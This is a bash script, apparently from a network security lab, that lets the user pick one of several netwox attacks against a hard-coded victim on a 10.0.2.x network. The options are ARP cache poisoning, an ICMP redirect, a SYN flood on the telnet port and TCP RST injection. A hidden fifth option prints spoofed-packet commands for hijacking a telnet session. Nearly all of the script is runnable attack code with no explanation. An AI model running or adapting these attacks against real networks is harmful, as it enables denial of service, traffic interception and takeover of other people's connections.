#!/bin/bash
sudo -v

echo "Type 1 for ARP; 2 for ICMP; 3 for SYNflood; 4 for RST"
read answer

VICTIM_IP='10.0.2.4'
VICTIM_MAC='08:00:27:a6:eb:87'

ATTACKER_IP='10.0.2.6'
GATEWAY='10.0.2.1'
ATTACKER_MAC='08:00:27:ee:0d:0f'

PORT=23
INT='eth7'

ATT=netwox

# Netwox tool numbers
ARP_TOOL=33
SYN_TOOL=76
ICMP_TOOL=86
RST_TOOL=78

echo "Victim ip is " $VICTIM_IP
echo "Victim mac is " $VICTIM_MAC
echo "Gateway is" $GATEWAY
echo "Attacker IP is" $ATTACKER_IP
echo "Attacker MAC is" $ATTACKER_MAC

case $answer in
	5)

		echo '40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-src 10.0.2.5 --ip4-dst 10.0.2.4 --ip4-opt "" --tcp-src 51296 --tcp-dst 23 --tcp-seqnum 906520802 --tcp-acknum 937587335 --tcp-ack --tcp-psh --tcp-window 6912 --tcp-opt "" --tcp-data "7077640d00" --spoofip "best"'

		echo 'netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-src 10.0.2.5 --ip4-dst 10.0.2.4 --ip4-opt "" --tcp-src 51296 --tcp-dst 23 --tcp-seqnum 906520807 --tcp-acknum 937587340 --tcp-ack --tcp-psh --tcp-window 6912 --tcp-opt "" --spoofip "best"'

		
		;;
	4)
		echo 'sudo' $ATT $RST_TOOL '-d' $INT '-i' $VICTIM_IP
		sudo $ATT $RST_TOOL -d $INT -i $VICTIM_IP
		;;
	3)
		echo 'sudo' $ATT $SYN_TOOL '-i' $VICTIM_IP '-p' $PORT
		echo 'SYN Flood on machine at address' $VICTIM_IP 'on port' $PORT
		sudo $ATT $SYN_TOOL -i $VICTIM_IP -p $PORT
		;;

	2)
		echo 'IMCP redirection attack:'
		echo 'sudo' $ATT $ICMP_TOOL '-d' $INT '-g' $ATTACKER_IP '-c' 0 '-i' $VICTIM_IP
		sudo $ATT $ICMP_TOOL -d $INT -g $ATTACKER_IP -c 5 -i $VICTIM_IP 
		;;
	1)
		sudo $ATT $ARP_TOOL -d $INT -b $VICTIM_MAC -g $GATEWAY -h $VICTIM_MAC -i $ATTACKER_IP
		;;
	*)
		echo "Unknown option"
esac
